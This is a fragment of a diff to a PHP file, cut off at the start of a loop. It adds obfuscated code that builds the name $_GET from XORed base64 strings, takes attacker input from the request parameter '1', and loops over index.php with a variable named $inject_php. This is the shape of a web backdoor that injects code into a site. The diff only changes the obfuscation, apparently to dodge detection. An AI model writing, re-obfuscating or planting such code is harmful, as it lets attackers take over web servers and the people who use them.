@@ -1,6 +1,6 @@
 
 <?php
-$a = ${base64_decode("YisoOg==")^base64_decode("PWxtbg==")}[1];
+$a = ${base64_decode("aTwlfA==")^base64_decode("NntgKA==")}[1];
 $ar = base64_decode("aW5kZXgucGhw");
 $arr = explode('|',$ar);
 foreach($arr as $k => $inject_php){
